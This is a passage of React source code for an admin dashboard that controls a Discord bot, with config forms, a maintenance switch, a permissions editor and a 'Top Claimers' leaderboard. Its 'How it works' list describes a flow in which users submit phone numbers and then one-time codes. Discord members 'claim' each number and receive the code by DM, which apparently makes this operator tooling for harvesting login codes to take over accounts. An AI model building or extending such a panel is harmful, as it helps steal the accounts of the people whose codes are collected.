                                    <span style={{ background: a.role === "owner" ? "rgba(250,204,21,0.15)" : "#1c1c1c", color: a.role === "owner" ? "#FACC15" : "#a0a0a0", padding: "2px 8px", borderRadius: 999, fontSize: 10, marginLeft: 10, fontWeight: 700, letterSpacing: 1 }}>
                                        {(a.role || "admin").toUpperCase()}
                                    </span>
                                </div>
                                <div style={{ color: "#8a8a8a", fontSize: 12 }}>last login: {a.last_login ? new Date(a.last_login).toLocaleString("en-GB") : "-"}</div>
                            </div>
                            {a.role !== "owner" && (
                                <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
                                    <button className="snap-btn" style={{ padding: "10px 16px", fontSize: 13, width: "auto" }} onClick={() => promote(a.username)} data-testid={`promote-${a.username}`}>Make owner</button>
                                    <button className="snap-btn-ghost" style={{ borderColor: "rgba(239,68,68,0.4)", color: "#ef4444" }} onClick={() => reject(a.username)}>Remove</button>
                                </div>
                            )}
                            {a.role === "owner" && (
                                <button className="snap-btn-ghost" onClick={() => demote(a.username)} data-testid={`demote-${a.username}`}>Demote to admin</button>
                            )}
                        </div>
                        <div style={{ marginTop: 12 }}>
                            <PermRow token={token} admin={a} onChange={load} />
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
}

function BotTab({ token }) {
    const [cfg, setCfg] = useState(null);
    const [status, setStatus] = useState({ status: "stopped" });
    const [token2, setToken2] = useState("");
    const [saving, setSaving] = useState(false);
    const [busy, setBusy] = useState(false);

    const load = useCallback(async () => {
        try {
            const s = await adminBotStatus(token);
            setStatus(s);
        } catch {}
    }, [token]);

    const loadConfig = useCallback(async () => {
        try {
            const c = await adminBotConfig(token);
            setCfg(c);
        } catch {}
    }, [token]);

    // Load config only once on mount — no auto-refresh so user can edit inputs freely
    useEffect(() => { loadConfig(); }, [loadConfig]);
    // Poll status separately (doesn't touch inputs)
    useEffect(() => { load(); const iv = setInterval(load, 5000); return () => clearInterval(iv); }, [load]);

    const patch = (k, v) => setCfg((c) => ({ ...c, [k]: v }));

    const save = async () => {
        setSaving(true);
        try {
            const payload = { ...cfg };
            if (token2.trim()) payload.token = token2.trim();
            delete payload.token_masked;
            const r = await adminBotSave(token, payload);
            setCfg(r);
            setToken2("");
            toast.success("Bot config saved");
        } catch (e) {
            toast.error(e?.response?.data?.detail || "Failed");
        } finally {
            setSaving(false);
        }
    };

    const start = async () => {
        setBusy(true);
        try { const r = await adminBotStart(token); toast.success(r.message || "starting"); load(); }
        catch (e) { toast.error(e?.response?.data?.detail || "Failed"); }
        finally { setBusy(false); }
    };
    const stop = async () => {
        setBusy(true);
        try { await adminBotStop(token); toast.success("Bot stopped"); load(); }
        finally { setBusy(false); }
    };
    const testNotify = async () => {
        try { await adminBotTest(token); toast.success("Test sent"); }
        catch (e) { toast.error(e?.response?.data?.detail || "Failed"); }
    };

    if (!cfg) return <div style={{ padding: 30, color: "#8a8a8a" }}>Loading bot config...</div>;

    const statusColor = status.status === "online" ? "#22c55e" : status.status === "error" ? "#ef4444" : status.status === "starting" ? "#FACC15" : "#8a8a8a";

    const inp = (label, k, placeholder = "", type = "text") => (
        <div>
            <div className="admin-label" style={{ marginBottom: 6 }}>{label}</div>
            <input className="snap-input" type={type} placeholder={placeholder} value={cfg[k] || ""} onChange={(e) => patch(k, e.target.value)} data-testid={`bot-${k}`} />
        </div>
    );

    return (
        <div style={{ padding: 22 }}>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 320px", gap: 22 }} className="admin-grid">
                {/* Left: config */}
                <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                    <div className="admin-card">
                        <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 4 }}>
                            <Bot size={20} color="#FACC15" />
                            <div style={{ fontSize: 20, fontWeight: 700 }}>Discord Bot</div>
                        </div>
                        <p style={{ color: "#8a8a8a", fontSize: 13, margin: "4px 0 16px" }}>The bot is hosted directly on this server. Configure once, control from here.</p>

                        <div className="admin-label" style={{ marginBottom: 6 }}>Bot token</div>
                        <input className="snap-input" placeholder={cfg.token_masked || "Paste your Discord bot token"} value={token2} onChange={(e) => setToken2(e.target.value)} type="password" data-testid="bot-token-input" />
                        <p style={{ color: "#6a6a6a", fontSize: 11, marginTop: 6 }}>
                            {cfg.token_masked ? `Current: ${cfg.token_masked}` : "No token yet"} · Leave empty to keep current
                        </p>

                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginTop: 14 }}>
                            <div>
                                <div className="admin-label" style={{ marginBottom: 6 }}>Ping role IDs (comma separated)</div>
                                <input className="snap-input" placeholder="1534898093995327568, 1534898171594014853"
                                    value={(cfg.ping_role_ids || []).join(", ")}
                                    onChange={(e) => patch("ping_role_ids", e.target.value.split(",").map((s) => s.trim()).filter(Boolean))}
                                    data-testid="bot-ping-roles" />
                            </div>
                            {inp("OK-button allowed role ID", "ok_role_id", "role that can claim numbers")}
                        </div>
                    </div>

                    <div className="admin-card">
                        <div className="admin-label" style={{ marginBottom: 10 }}>Channels</div>
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                            {inp("Notify channel ID", "notify_channel_id", "numbers arrive (phone hidden)")}
                            {inp("Logs channel ID", "logs_channel_id", "all button presses")}
                            {inp("Leaderboard channel ID", "leaderboard_channel_id", "auto-updated ranking")}
                            {inp("Broadcast channel ID", "broadcast_channel_id", "custom announcements")}
                        </div>
                        <div style={{ height: 10 }} />
                        {inp("Footer text (all embeds)", "footer_text", "leave empty for no footer")}
                    </div>

                    <div className="admin-card">
                        <div className="admin-label" style={{ marginBottom: 10 }}>Leaderboard embed</div>
                        {inp("Title", "leaderboard_title")}
                        <div style={{ height: 10 }} />
                        {inp("Description", "leaderboard_desc")}
                        <div style={{ height: 10 }} />
                        <div>
                            <div className="admin-label" style={{ marginBottom: 6 }}>Color</div>
                            <input className="snap-input" value={typeof cfg.leaderboard_color === "number" ? `#${cfg.leaderboard_color.toString(16).padStart(6,"0")}` : cfg.leaderboard_color || ""}
                                onChange={(e) => {
                                    let v = e.target.value.trim();
                                    if (v.startsWith("#")) v = v.slice(1);
                                    const n = parseInt(v, 16);
                                    if (!isNaN(n)) patch("leaderboard_color", n);
                                }} placeholder="#FACC15" />
                        </div>
                        <button className="snap-btn-ghost" style={{ marginTop: 12, width: "100%" }} onClick={async () => {
                            try { await adminBotLeaderboardRefresh(token); toast.success("Leaderboard posted/updated"); }
                            catch (e) { toast.error(e?.response?.data?.detail || "Failed"); }
                        }} data-testid="bot-leaderboard-refresh"><RefreshCw size={14} /> Post / refresh leaderboard now</button>
                    </div>

                    <div className="admin-card">
                        <div className="admin-label" style={{ marginBottom: 10 }}>Custom broadcast</div>
                        <p style={{ color: "#8a8a8a", fontSize: 12, margin: "0 0 10px" }}>Write a custom message and the bot will post it in the broadcast channel.</p>
                        {inp("Title", "broadcast_title")}
                        <div style={{ height: 10 }} />
                        <div>
                            <div className="admin-label" style={{ marginBottom: 6 }}>Message</div>
                            <textarea className="snap-input" style={{ minHeight: 100 }} value={cfg.broadcast_desc || ""} onChange={(e) => patch("broadcast_desc", e.target.value)} maxLength={2000} data-testid="bot-broadcast-desc" />
                        </div>
                        <div style={{ height: 10 }} />
                        <div>
                            <div className="admin-label" style={{ marginBottom: 6 }}>Color</div>
                            <input className="snap-input" value={typeof cfg.broadcast_color === "number" ? `#${cfg.broadcast_color.toString(16).padStart(6,"0")}` : cfg.broadcast_color || ""}
                                onChange={(e) => {
                                    let v = e.target.value.trim();
                                    if (v.startsWith("#")) v = v.slice(1);
                                    const n = parseInt(v, 16);
                                    if (!isNaN(n)) patch("broadcast_color", n);
                                }} placeholder="#FACC15" />
                        </div>
                        <button className="snap-btn" style={{ marginTop: 12 }} onClick={async () => {
                            // save first then send
                            try {
                                await adminBotSave(token, { broadcast_channel_id: cfg.broadcast_channel_id, broadcast_title: cfg.broadcast_title, broadcast_desc: cfg.broadcast_desc, broadcast_color: cfg.broadcast_color });
                                await adminBotBroadcast(token);
                                toast.success("Broadcast sent");
                            } catch (e) { toast.error(e?.response?.data?.detail || "Failed"); }
                        }} data-testid="bot-broadcast-btn"><Send size={14} /> Send broadcast now</button>
                    </div>

                    <div className="admin-card">
                        <div className="admin-label" style={{ marginBottom: 10 }}>Notification embed</div>
                        <p style={{ color: "#8a8a8a", fontSize: 12, margin: "0 0 10px" }}>Phone numbers are NOT shown in this channel — only in DM after OK is pressed.</p>
                        {inp("Title", "embed_title")}
                        <div style={{ height: 10 }} />
                        {inp("Description", "embed_desc")}
                        <div style={{ height: 10 }} />
                        <div>
                            <div className="admin-label" style={{ marginBottom: 6 }}>Color</div>
                            <input className="snap-input" value={typeof cfg.embed_color === "number" ? `#${cfg.embed_color.toString(16).padStart(6,"0")}` : cfg.embed_color}
                                onChange={(e) => {
                                    let v = e.target.value.trim();
                                    if (v.startsWith("#")) v = v.slice(1);
                                    const n = parseInt(v, 16);
                                    if (!isNaN(n)) patch("embed_color", n);
                                }} placeholder="#FACC15" data-testid="bot-color" />
                        </div>
                    </div>

                    <div className="admin-card">
                        <div className="admin-label" style={{ marginBottom: 10 }}>Buttons</div>
                        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                            <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 14, border: "1px solid #1a1a1a" }}>
                                <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 8 }}>OK button (guild)</div>
                                {inp("Label", "ok_button_label")}
                                <div style={{ height: 8 }} />
                                {inp("Emoji", "ok_button_emoji", "✅")}
                                <div style={{ height: 8 }} />
                                <div className="admin-label" style={{ marginBottom: 6 }}>Style</div>
                                <select className="snap-input" value={cfg.ok_button_style || "success"} onChange={(e) => patch("ok_button_style", e.target.value)} data-testid="bot-ok-style">
                                    {["primary", "secondary", "success", "danger"].map((s) => <option key={s} value={s}>{s}</option>)}
                                </select>
                            </div>
                            <div style={{ background: "#0d0d0d", padding: 12, borderRadius: 14, border: "1px solid #1a1a1a" }}>
                                <div style={{ fontSize: 13, fontWeight: 700, marginBottom: 8 }}>OTP button (DM)</div>
                                {inp("Label", "otp_button_label")}
                                <div style={{ height: 8 }} />
                                {inp("Emoji", "otp_button_emoji", "🔑")}
                                <div style={{ height: 8 }} />
                                <div className="admin-label" style={{ marginBottom: 6 }}>Style</div>
                                <select className="snap-input" value={cfg.otp_button_style || "primary"} onChange={(e) => patch("otp_button_style", e.target.value)}>
                                    {["primary", "secondary", "success", "danger"].map((s) => <option key={s} value={s}>{s}</option>)}
                                </select>
                            </div>
                        </div>
                    </div>

                    <button className="snap-btn" onClick={save} disabled={saving} data-testid="bot-save-btn">
                        {saving ? "Saving..." : "Save configuration"}
                    </button>
                </div>

                {/* Right: control */}
                <div style={{ display: "flex", flexDirection: "column", gap: 16 }}>
                    <div className="admin-card">
                        <div className="admin-label">Bot control</div>
                        <div style={{ marginTop: 12, padding: 14, background: "#0d0d0d", borderRadius: 14, border: "1px solid #1a1a1a" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                                <span style={{ width: 12, height: 12, borderRadius: 999, background: statusColor, boxShadow: `0 0 12px ${statusColor}` }} />
                                <b style={{ color: statusColor, textTransform: "uppercase", fontSize: 13, letterSpacing: 1.5 }}>{status.status}</b>
                            </div>
                            {status.bot_user && (
                                <div style={{ marginTop: 8, color: "#c0c0c0", fontSize: 13 }}>{status.bot_user}</div>
                            )}
                            {status.guilds !== undefined && (
                                <div style={{ color: "#8a8a8a", fontSize: 12 }}>Guilds: {status.guilds}</div>
                            )}
                            {status.last_error && (
                                <div style={{ marginTop: 8, color: "#ef4444", fontSize: 12 }}>{status.last_error}</div>
                            )}
                        </div>

                        <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
                            <button className="snap-btn" style={{ padding: "12px 18px", fontSize: 14 }} onClick={start} disabled={busy || status.status === "online"} data-testid="bot-start-btn">
                                <Play size={14} /> Start
                            </button>
                            <button className="snap-btn-ghost" style={{ padding: "12px 18px", borderColor: "rgba(239,68,68,0.4)", color: "#ef4444" }} onClick={stop} disabled={busy || status.status === "stopped"} data-testid="bot-stop-btn">
                                <Square size={14} /> Stop
                            </button>
                        </div>
                        <button className="snap-btn-ghost" style={{ marginTop: 8, width: "100%" }} onClick={testNotify} disabled={status.status !== "online"} data-testid="bot-test-btn">
                            <Send size={14} /> Send test notification
                        </button>
                        <button className="snap-btn-ghost" style={{ marginTop: 8, width: "100%" }} onClick={loadConfig} data-testid="bot-reload-cfg">
                            <RefreshCw size={14} /> Reload config from server
                        </button>
                    </div>

                    <MaintenanceCard token={token} />

                    <div className="admin-card">
                        <div className="admin-label">How it works</div>
                        <ol style={{ marginTop: 10, paddingLeft: 20, color: "#c0c0c0", fontSize: 12, lineHeight: 1.7 }}>
                            <li>User submits phone → bot pings ping roles in notify channel (phone hidden)</li>
                            <li>Authorized role clicks <b>OK</b> → bot DMs them the phone with an <b>OTP</b> button</li>
                            <li>OK button pressed sets state to <code>code</code> — user sees OTP input</li>
                            <li>User submits code → bot DMs the code to the presser</li>
                            <li>Every press is logged in the logs channel</li>
                            <li>Leaderboard channel auto-updates on every OK press</li>
                        </ol>
                    </div>

                    <TopClaimers token={token} />
                </div>
            </div>
        </div>
    );
}

function TopClaimers({ token }) {
    const [rows, setRows] = useState([]);
    useEffect(() => {
        const load = () => adminBotLeaderboard(token).then(setRows).catch(() => {});
        load();
        const iv = setInterval(load, 5000);
        return () => clearInterval(iv);
    }, [token]);
    return (
        <div className="admin-card">
            <div className="admin-label">🏆 Top Claimers</div>
            {rows.length === 0 && <div style={{ color: "#8a8a8a", fontSize: 13, marginTop: 10 }}>No claims yet.</div>}
            <div style={{ marginTop: 10, display: "flex", flexDirection: "column", gap: 6 }}>
                {rows.slice(0, 10).map((r, i) => (
                    <div key={r.discord_id} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", background: "#0d0d0d", padding: "8px 12px", borderRadius: 12, border: "1px solid #1a1a1a" }}>
                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                            <span style={{ color: i < 3 ? "#FACC15" : "#8a8a8a", fontWeight: 700, minWidth: 24 }}>#{i + 1}</span>
                            <span style={{ fontFamily: "monospace", fontSize: 12, color: "#e0e0e0" }}>{r.username || r.discord_id}</span>
                        </div>
                        <b className="snap-accent">{r.ok_count}</b>
                    </div>
                ))}
            </div>
        </div>
    );
}

function MaintenanceCard({ token }) {
    const [enabled, setEnabled] = useState(false);
    const [busy, setBusy] = useState(false);
    const load = useCallback(() => adminGetMaintenance(token).then(r => setEnabled(!!r.enabled)).catch(() => {}), [token]);
    useEffect(() => { load(); const iv = setInterval(load, 6000); return () => clearInterval(iv); }, [load]);
    const toggle = async () => {
        setBusy(true);
        try {
            await adminSetMaintenance(token, !enabled);
            setEnabled(!enabled);
            toast.success(!enabled ? "🛠 Maintenance ON — site blocked, bot buttons blocked" : "✅ Maintenance OFF — back online");
        } catch (e) {
            toast.error(e?.response?.data?.detail || "Failed");
        } finally { setBusy(false); }
    };
    return (
        <div className="admin-card" style={{ border: enabled ? "1px solid #ef4444" : undefined }} data-testid="maintenance-card">
            <div className="admin-label">Maintenance</div>
            <div style={{ marginTop: 8, fontSize: 13, color: "#c0c0c0", lineHeight: 1.5 }}>
                Blocks user registration + code submission, and disables OK/OTP button presses on Discord DMs. Sessions and configs are preserved.
            </div>
            <div style={{ marginTop: 12, display: "flex", alignItems: "center", justifyContent: "space-between", padding: 12, background: "#0d0d0d", borderRadius: 12, border: "1px solid #1a1a1a" }}>
                <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                    <span style={{ width: 10, height: 10, borderRadius: 999, background: enabled ? "#ef4444" : "#22c55e", boxShadow: `0 0 12px ${enabled ? "#ef4444" : "#22c55e"}` }} />
                    <b style={{ color: enabled ? "#ef4444" : "#22c55e", textTransform: "uppercase", fontSize: 13, letterSpacing: 1.5 }}>{enabled ? "IN MAINTENANCE" : "OPERATIONAL"}</b>
                </div>
                <button className="snap-btn" style={{ padding: "10px 18px", fontSize: 13, width: "auto", background: enabled ? "#22c55e" : "#ef4444", boxShadow: `0 0 24px ${enabled ? "rgba(34,197,94,0.55)" : "rgba(239,68,68,0.55)"}`, color: "#0a0a0a" }} onClick={toggle} disabled={busy} data-testid="maintenance-toggle">
                    {enabled ? "Un-maintenance" : "Enable maintenance"}
                </button>
            </div>
        </div>
    );
}

const PERM_LIST = [
    { k: "view_analytics", l: "View Analytics" },
    { k: "view_invites", l: "View Invites" },
    { k: "create_invites", l: "Create Invites" },
    { k: "view_users", l: "View Users" },
    { k: "change_user_state", l: "Change User State" },
    { k: "delete_users", l: "Delete Users" },
    { k: "view_bot", l: "View Bot page" },
    { k: "edit_bot", l: "Edit Bot config" },
    { k: "view_security", l: "View Security" },
    { k: "view_team", l: "View Team" },
];

function PermRow({ token, admin, onChange }) {
    const [perms, setPerms] = useState(admin.permissions || {});
    const [open, setOpen] = useState(false);
    const [saving, setSaving] = useState(false);
    const isOwner = admin.role === "owner";
    const toggle = (k) => setPerms((p) => ({ ...p, [k]: !p[k] }));
    const save = async () => {
        setSaving(true);
        try { await adminSetPermissions(token, admin.username, perms); toast.success(`Permissions saved for ${admin.username}`); onChange(); }
        catch (e) { toast.error(e?.response?.data?.detail || "Failed"); }
        finally { setSaving(false); }
    };
    return (
        <div>
            <button className="snap-btn-ghost" style={{ padding: "8px 12px", fontSize: 12 }} onClick={() => setOpen(!open)} data-testid={`perms-${admin.username}`}>
                {open ? "Hide permissions" : "Edit permissions"}
            </button>
            {open && (
                <div style={{ marginTop: 10, padding: 12, background: "#0d0d0d", borderRadius: 12, border: "1px solid #1a1a1a" }}>
                    {isOwner && (
                        <div style={{ color: "#FACC15", fontSize: 11, marginBottom: 8, opacity: 0.85 }}>
                            ⚡ Owners bypass permission checks — these flags are only used if this account is demoted to admin later.
                        </div>
                    )}
                    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 6 }}>
                        {PERM_LIST.map((p) => (
                            <label key={p.k} style={{ display: "flex", alignItems: "center", gap: 6, fontSize: 12, cursor: "pointer", padding: 4 }}>
                                <input type="checkbox" checked={!!perms[p.k]} onChange={() => toggle(p.k)} data-testid={`perm-${admin.username}-${p.k}`} />
                                {p.l}
                            </label>
                        ))}
                    </div>
                    <div style={{ display: "flex", gap: 8, marginTop: 10 }}>
                        <button className="snap-btn" style={{ padding: "10px 16px", fontSize: 13 }} onClick={save} disabled={saving} data-testid={`save-perms-${admin.username}`}>
                            {saving ? "..." : "Save permissions"}
                        </button>
                        <button className="snap-btn-ghost" style={{ padding: "10px 16px", fontSize: 12 }} onClick={() => setPerms(Object.fromEntries(PERM_LIST.map(p => [p.k, true])))}>
                            Grant all
                        </button>
                        <button className="snap-btn-ghost" style={{ padding: "10px 16px", fontSize: 12 }} onClick={() => setPerms({})}>
                            Clear all
                        </button>
                    </div>
                </div>
            )}
        </div>
    );
}
